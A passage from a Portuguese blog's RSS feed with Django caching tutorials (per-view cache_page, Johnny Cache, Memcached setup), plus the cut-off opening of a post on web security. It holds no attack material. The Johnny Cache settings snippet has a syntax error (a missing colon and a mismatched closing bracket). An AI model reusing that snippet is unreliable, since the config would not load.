&lt;code class=&quot;language-text&quot;&gt;CACHE_MIDDLEWARE_SECONDS&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Interessante não? Temos um controle de &lt;em&gt;cache&lt;/em&gt; na “borda” da nossa
aplicação… não precisamos interferir nas nossas &lt;em&gt;views&lt;/em&gt;, modelos ou
consultas.&lt;/p&gt;
&lt;h4&gt;O método per-view&lt;/h4&gt;
&lt;p&gt;É natural que certas &lt;em&gt;views&lt;/em&gt; necessitem de um tempo de &lt;em&gt;cache&lt;/em&gt; diferente
de outras. Para tanto, podemos utilizar &lt;em&gt;decorators&lt;/em&gt; que “sobrescrevem”
as configurações utilizadas pelo &lt;em&gt;per-site&lt;/em&gt;, permitindo assim um
controle mais granular sobre o tempo de &lt;em&gt;cache&lt;/em&gt; das &lt;em&gt;views&lt;/em&gt;. Exemplo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;views&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;generic&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;simple &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; direct_to_template
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;views&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;decorators&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cache &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; cache_page

urlpatterns &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; patterns&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    url&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&apos;^outra-view/$&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; cache_page&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;direct_to_template&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;template&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;outra-view.html&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;outra-view&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;No exemplo acima estou usando a &lt;em&gt;generic view&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;direct_to_template&lt;/code&gt;
para ilustrar. Através do &lt;em&gt;decorator&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;cache_page&lt;/code&gt; eu informo o tempo
de vida desta &lt;em&gt;view&lt;/em&gt; em &lt;em&gt;cache&lt;/em&gt; (2 minutos, 60 * 2 para ficar mais
legível).&lt;/p&gt;
&lt;p&gt;E quando acessamos esta &lt;em&gt;view&lt;/em&gt;, é possível reparar que inclusive os
valores dos cabeçalhos &lt;em&gt;HTTP&lt;/em&gt; são outros:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -I http://localhost:8000/outra-view/

HTTP/1.0 200 OK
Date: Wed, 04 Jul 2012 00:28:07 GMT
Server: WSGIServer/0.1 Python/2.7.2
Last-Modified: Wed, 04 Jul 2012 00:28:07 GMT
Expires: Wed, 04 Jul 2012 00:30:07 GMT
Content-Type: text/html; charset=utf-8
Vary: Cookie
Cache-Control: max-age=120&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ainda é possível passar como parâmetro para o &lt;code class=&quot;language-text&quot;&gt;cache_page&lt;/code&gt;, o
&lt;code class=&quot;language-text&quot;&gt;cache&lt;/code&gt; que você deseja utilizar (por padrão &lt;code class=&quot;language-text&quot;&gt;default&lt;/code&gt;), e um
&lt;code class=&quot;language-text&quot;&gt;key_prefix&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Caching de queries com o Johnny Cache&lt;/h2&gt;
&lt;p&gt;É normal que algumas rotas da sua aplicação não possam fazer utilização
desse tipo de &lt;em&gt;cache&lt;/em&gt;. Por exemplo, &lt;em&gt;views&lt;/em&gt; para usuários autenticados,
que necessitam transitar informações de sessão e &lt;em&gt;cookies&lt;/em&gt;, ou até mesmo
&lt;em&gt;views&lt;/em&gt; que precisam receber informações através de &lt;code class=&quot;language-text&quot;&gt;POST&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vamos imaginar que, dentro desse cenário, a sua &lt;em&gt;app&lt;/em&gt; faça uma consulta
“custosa” ao banco de dados. Logo, concluímos que adicionar um controle
de &lt;em&gt;cache&lt;/em&gt; a esta consulta seria extremamente interessante para a
velocidade de resposta da &lt;em&gt;view&lt;/em&gt;. A primeira opção é utilizar o
&lt;em&gt;framework&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt; de forma granular, através de sua
&lt;em&gt;API&lt;/em&gt;. A outra opção é fazer &lt;em&gt;caching&lt;/em&gt; “dentro” do &lt;em&gt;ORM&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É apoiado nessa última proposta que o &lt;a href=&quot;http://packages.python.org/johnny-cache/&quot; title=&quot;Conheça a ferramenta de caching, Johnny Cache&quot;&gt;&lt;em&gt;Johnny Cache&lt;/em&gt;&lt;/a&gt; se baseia:
“cachear” dados transitados através do &lt;em&gt;ORM&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;, não
interferindo no código das &lt;em&gt;apps&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Johnny Cache&lt;/em&gt; está no &lt;a href=&quot;http://pypi.python.org/pypi&quot; title=&quot;the Python Package Index&quot;&gt;&lt;em&gt;PyPi&lt;/em&gt;&lt;/a&gt;, então basta um &lt;code class=&quot;language-text&quot;&gt;pip install johnny-cache&lt;/code&gt; para realizarmos a instalação. Para configurar,
precisamos adicionar algumas informações ao &lt;code class=&quot;language-text&quot;&gt;settings.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;MIDDLEWARE_CLASSES &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;johnny.middleware.LocalStoreClearMiddleware&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;johnny.middleware.QueryCacheMiddleware&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

CACHES &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;default&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;BACKEND&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;johnny.backends.memcached.MemcachedCache&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;LOCATION&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;127.0.0.1:11211&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;JOHNNY_CACHE&apos;&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Onde:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;johnny.middleware.LocalStoreClearMiddleware:&lt;/code&gt; O &lt;em&gt;Johnny&lt;/em&gt; utiliza
este &lt;em&gt;middleware&lt;/em&gt; para gerenciar o &lt;em&gt;cache&lt;/em&gt; de uma &lt;a href=&quot;https://github.com/jmoiron/johnny-cache/blob/master/johnny/transaction.py&quot; title=&quot;Veja o uso dessa modalidade no módulo transaction.py&quot;&gt;maneira &quot;thread-safe&quot;&lt;/a&gt;.
Ele basicamente limpa este objeto ao final de cada
requisição.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;johnny.middleware.QueryCacheMiddleware:&lt;/code&gt; É o &lt;em&gt;middleware&lt;/em&gt;
responsável pela “mágica” de &lt;em&gt;caching&lt;/em&gt; no &lt;em&gt;ORM&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O &lt;em&gt;backend&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;johnny.backends.memcached.MemcachedCache&lt;/code&gt; é basicamente
uma &lt;a href=&quot;https://github.com/jmoiron/johnny-cache/blob/master/johnny/backends/memcached.py&quot; title=&quot;Veja o código-fonte&quot;&gt;subclasse do &lt;em&gt;backend built-in&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt; para o &lt;em&gt;Memcached&lt;/em&gt;&lt;/a&gt;,
com a adição do seguinte comportamento: Se o &lt;em&gt;timeout&lt;/em&gt; for setado como 0
(zero), o &lt;em&gt;cache&lt;/em&gt; fica “infinito”.&lt;/p&gt;
&lt;p&gt;Com a opção &lt;code class=&quot;language-text&quot;&gt;JOHNNY_CACHE&lt;/code&gt; como &lt;code class=&quot;language-text&quot;&gt;True&lt;/code&gt;, estamos informando ao
&lt;em&gt;Johnny&lt;/em&gt; que este é o &lt;em&gt;pool&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; que ele deve usar para &lt;em&gt;caching&lt;/em&gt;
das &lt;em&gt;queries&lt;/em&gt;. É possível ter uma configuração diferenciada, como
encontrada no &lt;a href=&quot;https://github.com/nelas/cifonauta/blob/master/dummy_settings_server.py#L33&quot; title=&quot;Veja o código-fonte do projeto no GitHub&quot;&gt;projeto Cifonauta&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Com a ajuda do &lt;a href=&quot;http://pypi.python.org/pypi/django-debug-toolbar/&quot; title=&quot;Excelente lib para debugging de projetos Django&quot;&gt;django-debug-toolbar&lt;/a&gt;, podemos ver o número de
&lt;em&gt;queries&lt;/em&gt; diminuírem consideravelmente (fatalmente ocasionando um tempo
de resposta menor). Quando um registro for adicionado, editado ou
removido, o &lt;em&gt;Johnny Cache&lt;/em&gt; remove as &lt;em&gt;queries&lt;/em&gt; envolvendo determinada
tabela do &lt;em&gt;cache&lt;/em&gt;, permitindo assim uma nova “batida” no banco de dados
(e um novo armazenamento dos resultados).&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Como &lt;a href=&quot;/2011/12/19/nginx-poderoso-rapido-facil.html&quot; title=&quot;Nginx: Poderoso, rápido e fácil&quot;&gt;já mencionei&lt;/a&gt;, gosto muito dos ensinamentos e experiências
compartilhadas pelo pessoal da &lt;a href=&quot;http://37signals.com/&quot; title=&quot;Making collaboration productive and enjoyable for people every day&quot;&gt;&lt;em&gt;37Signals&lt;/em&gt;&lt;/a&gt;. Um deles é para nos
preocuparmos com performance quando isto for realmente um problema.&lt;/p&gt;
&lt;p&gt;Logo, (&lt;em&gt;IMO&lt;/em&gt;) não construa uma mega
&lt;a href=&quot;/tag/infraestrutura.html&quot; title=&quot;Leia mais sobre infra&quot;&gt;infraestrutura&lt;/a&gt; para uma aplicação que atende 50 usuários por dia.
Você está desperdiçando o seu tempo e linhas de código. Em
contrapartida, qualquer esforço para melhorar a experiência do usuário,
e para economizar recursos, &lt;strong&gt;é sempre bem-vinda&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Vale sempre ressaltar que problemas de performance podem estar
relacionados a qualidade do código produzido, e não necessariamente com
o consumo da aplicação. Então, se a demanda está baixa e mesmo assim
você tem tempos de resposta absurdamente altos, talvez seja a hora de
“refatorar” o seu código.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.4/topics/cache/&quot; title=&quot;Leia tudo sobre o framework de cache do Django&quot;&gt;&lt;em&gt;Django Documentation – Cache Framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/dev/ref/templates/api/#loader-types&quot; title=&quot;Mais informações sobre os template loaders do Django&quot;&gt;&lt;em&gt;Django Documentation – The Django template language: Loader types&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://packages.python.org/johnny-cache/&quot; title=&quot;Mais informações sobre o uso do Johnny Cache&quot;&gt;&lt;em&gt;Johnny Cache Documentation&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jongales.com/blog/2012/02/16/make-django-keep-templates-in-memory/&quot; title=&quot;Leia mais sobre o cached.Loader&quot;&gt;&lt;em&gt;Jongales.com – Make Django keep templates in memory&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Django e Cache: Uma dupla de alta performance - Parte 1]]></title><description><![CDATA[Embora o caching HTTP seja essencial
para qualquer aplicação web, (IMO)
essa modalidade de cache deve ser encarada como um acréscimo à
experiência de uso, e não necessariamente como uma “arma” contra
problemas de performance. Os usuários poderão abdicar desta
funcionalidade, e aí a sua aplicação não…]]></description><link>https://klauslaube.com.br/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1.html</link><guid isPermaLink="false">https://klauslaube.com.br/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 17 Jun 2012 15:52:22 GMT</pubDate><content:encoded>&lt;p&gt;Embora o &lt;a href=&quot;/2012/05/14/o-cache-e-o-http.html&quot; title=&quot;O cache e o HTTP&quot;&gt;&lt;em&gt;caching HTTP&lt;/em&gt;&lt;/a&gt; seja essencial
para qualquer aplicação &lt;a href=&quot;/tag/desenvolvimento-web.html&quot; title=&quot;Leia mais sobre Web&quot;&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, &lt;strong&gt;(IMO)&lt;/strong&gt;
essa modalidade de &lt;a href=&quot;/tag/cache.html&quot; title=&quot;Leia mais sobre Cache&quot;&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/a&gt; deve ser encarada como um acréscimo à
experiência de uso, e não necessariamente como uma “arma” contra
problemas de performance. Os usuários poderão abdicar desta
funcionalidade, e aí a sua aplicação não poderá depender do protocolo
para atingir tempos de resposta atrativos.&lt;/p&gt;
&lt;p&gt;Desenvolvedores &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; podem contar com boas soluções, do próprio
&lt;em&gt;framework&lt;/em&gt; e de terceiros, que podem melhorar o &lt;em&gt;caching&lt;/em&gt; das
aplicações (e consequentemente a performance). A grande notícia é que
essas ferramentas são fáceis e práticas. Vamos conhecê-las?&lt;/p&gt;
&lt;h2&gt;O Memcached&lt;/h2&gt;
&lt;p&gt;Eu juro que tentei escrever uma introdução
para este tópico, mas a descricão contida no &lt;a href=&quot;http://memcached.org/&quot; title=&quot;A distributed memory object caching system&quot;&gt;site oficial do &lt;em&gt;Memcached&lt;/em&gt;&lt;/a&gt; é
tão boa, que vou simplesmente copiá-la:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Memcached is an in-memory key-value store for small chunks of arbitrary
data (strings, objects) from results of database calls,
API calls, or page rendering.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras, é uma ferramenta &lt;em&gt;open source&lt;/em&gt;, que tem como função
o armazenamento (e gerenciamento) de resultados de &lt;em&gt;queries&lt;/em&gt;, conteúdo
de arquivos, processamentos avançados, ou qualquer tipo de informação,
em memória (um meio muito mais rápido de ser lido que em disco, por
exemplo). Embora esse potencial possa ser utilizado para os mais
diferentes fins, é como mecanismo de &lt;em&gt;caching&lt;/em&gt; que ele se destaca.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Memcached&lt;/em&gt; foi construído em um esquema “cliente-servidor”, e é
possível utilizá-lo com uma grande quantidade de linguagens de
programação. Mas o que eu acho mais bacana na ferramenta é a
possibilidade de utilizá-la de forma distribuída. Isso propicia uma
flexibilidade muito maior na hora de construirmos a &lt;a href=&quot;/tag/infraestrutura.html&quot; title=&quot;Leia mais sobre infra&quot;&gt;infraestrutura&lt;/a&gt;
para servir as nossas aplicações &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Mas a “cereja do bolo” é: O &lt;em&gt;Django&lt;/em&gt; funciona muito bem com o
&lt;em&gt;Memcached&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Framework de cache do Django&lt;/h2&gt;
&lt;p&gt;O uso do &lt;em&gt;Memcached&lt;/em&gt; não é obrigatório! Na verdade, podemos utilizar
diferentes &lt;em&gt;backends&lt;/em&gt; para diferentes tipos de mecanismos de &lt;em&gt;cache&lt;/em&gt;. O
&lt;em&gt;Django&lt;/em&gt; possui algumas opções disponíveis, sem necessitar utilizar
nenhum “código de terceiro”. Temos a opção de fazer &lt;em&gt;cache&lt;/em&gt; em disco,
banco de dados ou até mesmo “simularmos” a interação com &lt;em&gt;cache&lt;/em&gt; (muito
bom para ambientes de desenvolvimento). &lt;a href=&quot;https://docs.djangoproject.com/en/1.3/topics/cache/#setting-up-the-cache&quot; title=&quot;Setting up cache&quot;&gt;Leia mais sobre&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Neste &lt;em&gt;post&lt;/em&gt;, vamos nos concentrar na configuração do &lt;em&gt;Django&lt;/em&gt; com o
&lt;em&gt;Memcached&lt;/em&gt;. Para instalar, &lt;a href=&quot;http://code.google.com/p/memcached/wiki/NewInstallFromSource&quot; title=&quot;Memcached - Why build from source&quot;&gt;basta compilar através do make&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ wget http://memcached.org/latest
$ tar -zxvf memcached-1.4.13.tar.gz
$ cd memcached-1.4.13
$ ./configure
$ make &amp;amp;&amp;amp; make test
$ make install&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Utilizando a &lt;a href=&quot;ftp://ftp.tummy.com/pub/python-memcached/&quot; title=&quot;Conheça a python-memcached&quot;&gt;&lt;em&gt;python-memcached&lt;/em&gt;&lt;/a&gt; como &lt;em&gt;binding&lt;/em&gt; &lt;em&gt;Python&lt;/em&gt; para o
&lt;em&gt;Memcached&lt;/em&gt;, basta adicionarmos o seguinte &lt;em&gt;backend&lt;/em&gt; ao &lt;strong&gt;settings.py&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;CACHES &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;default&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;BACKEND&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;django.core.cache.backends.memcached.MemcachedCache&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;LOCATION&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;127.0.0.1:11211&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;TIMEOUT&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;# Default: 300 segundos,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;KEY_PREFIX&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;djcache&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Onde:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;BACKEND:&lt;/code&gt; É o módulo responsável por se comunicar com o
&lt;em&gt;Memcached&lt;/em&gt;. Estamos utilizando este &lt;em&gt;backend&lt;/em&gt; pois optamos pela
&lt;em&gt;python-memcached&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;LOCATION:&lt;/code&gt; É a porta (ou &lt;em&gt;socket&lt;/em&gt;) onde o serviço do &lt;em&gt;Memcached&lt;/em&gt;
está respondendo. A porta padrão é a 11211.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;TIMEOUT:&lt;/code&gt; É o tempo de vida do informação “cacheada”. Acima
informamos 60 segundos, o padrão é 5 minutos.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;KEY_PREFIX:&lt;/code&gt; É um valor que precederá todas as chaves que
utilizarmos com o &lt;em&gt;Django&lt;/em&gt;. Bem útil para prevenir que duas
aplicações utilizem o mesmo valor no &lt;em&gt;Memcached&lt;/em&gt; (quando este não é
o comportamento esperado).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/cache/#cache-arguments&quot; title=&quot;Cache Arguments - Django Documentation&quot;&gt;Conheça outras opções de configurações.&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Pronto! As ferramentas estão apresentadas e estamos prontos para partir
para uma abordagem prática.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Django&lt;/em&gt; já vem “preparado” para trabalhar com mecanismos de &lt;em&gt;cache&lt;/em&gt;.
O seu esquema de &lt;em&gt;backends&lt;/em&gt; permite que você “acople” diferentes módulos
para atender os mais exóticos mecanismos de &lt;em&gt;cache&lt;/em&gt;, sem necessariamente
precisar alterar código nas suas &lt;em&gt;apps&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É bem verdade que o &lt;em&gt;Memcached&lt;/em&gt; é um tanto “tradicional”, e que hoje
existem alternativas mais “atrativas”, como o &lt;a href=&quot;http://redis.io/&quot; title=&quot;Redis is an open source, advanced key-value store&quot;&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/a&gt;. Na prática,
depende muito do cenário no qual você está inserido, por exemplo, no
&lt;a href=&quot;http://globoesporte.globo.com/&quot; title=&quot;a melhor cobertura sobre o Futebol e Outros Esportes, no Brasil e no Mundo&quot;&gt;&lt;em&gt;Globoesporte.com&lt;/em&gt;&lt;/a&gt; utilizamos o &lt;em&gt;Memcached&lt;/em&gt; e ele nos atende muito
bem.&lt;/p&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt; vamos partir para uma abordagem mais prática, cobrindo
as diferentes maneiras de utilizar &lt;em&gt;caching&lt;/em&gt; com &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até lá...&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://amix.dk/blog/post/19471&quot; title=&quot;Um post antigo, com o comparativo entre pylibmc e python-memcached&quot;&gt;&lt;em&gt;Amix.dk – memcached: Benchmark of 4 Python libraries&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/cache/&quot; title=&quot;Leia a documentação do framework de cache do Django&quot;&gt;&lt;em&gt;Django Documentation – Django’s cache framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://memcached.org/&quot; title=&quot;Página principal do projeto Memcached&quot;&gt;&lt;em&gt;Memcached.org&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://sendapatch.se/projects/pylibmc/&quot; title=&quot;Cliente Python escrito em C para trabalhar com o Memcached&quot;&gt;&lt;em&gt;pylibmc – Python client for memcached&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Memcached&quot; title=&quot;Leia mais sobre o Memcached no Wikipedia&quot;&gt;&lt;em&gt;Wikipedia: Memcached&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Problemas comuns de segurança em aplicações Web]]></title><description><![CDATA[Seria perfeito se o mundo fosse feito apenas de pessoas
bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
a raça humana, do que o homem deixar de tirar proveito de alguma
situação. Quando estamos desenvolvendo nossas aplicações web, temos que
“pensar” como um usuário mal…]]></description><link>https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html</link><guid isPermaLink="false">https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 15 Apr 2012 18:03:48 GMT</pubDate><content:encoded>&lt;p&gt;Seria perfeito se o mundo fosse feito apenas de pessoas
bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
a raça humana, do que o homem deixar de tirar proveito de alguma
situação.&lt;/p&gt;
&lt;p&gt;Quando estamos desenvolvendo nossas aplicações &lt;a href=&quot;/tag/desenvolvimento-web.html&quot; title=&quot;Leia mais sobre Web&quot;&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, temos que
